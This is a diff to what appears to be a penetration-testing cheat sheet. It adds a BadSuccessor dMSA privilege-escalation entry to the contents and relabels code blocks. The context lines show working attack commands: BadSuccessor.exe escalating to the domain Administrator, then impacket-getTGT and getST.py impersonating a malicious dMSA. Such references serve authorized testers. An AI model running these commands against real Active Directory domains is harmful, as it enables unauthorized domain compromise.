@@ -45,6 +45,7 @@
 - [CVE-2025-29927: Next.js Authentication Bypass](#cve-2025-29927-nextjs-authentication-bypass)
 - [CVE-2025-3155: Yelp File Read](#cve-2025-3155-yelp-file-read)
 - [CVE-2025-32463: chwoot sudo LPE](#cve-2025-32463-chwoot-sudo-lpe)
+- [BadSuccessor Delegated Managed Service Account (dMSA) LPE](#badsuccessor-delegated-managed-service-account-dmsa-lpe)
 - [GodPotato LPE](#godpotato-lpe)
 - [Juicy Potato LPE](#juicy-potato-lpe)
 - [JuicyPotatoNG LPE](#juicypotatong-lpe)
@@ -2235,15 +2236,15 @@ PS C:\> .\BadSuccessor.exe find
 PS C:\> .\BadSuccessor.exe escalate -targetOU "OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>" -dmsa evildmsa -targetUser "CN=Administrator,CN=Users,DC=<DOMAIN>,DC=<DOMAIN>" -dnshostname evildmsa -user <USERNAME> -dc-ip <RHOST>
 ```
 
-```shell
+```console
 $ impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>
 ```
 
-```shell
+```console
 $ export KRB5CCNAME=<FILE>.ccache
 ```
 
-```shell
+```console
 $ python3 getST.py <DOMAIN>/<USERNAME> -dc-ip <RHOST> -self -dmsa -impersonate evildmsa$ -k -no-pass
 ```
 
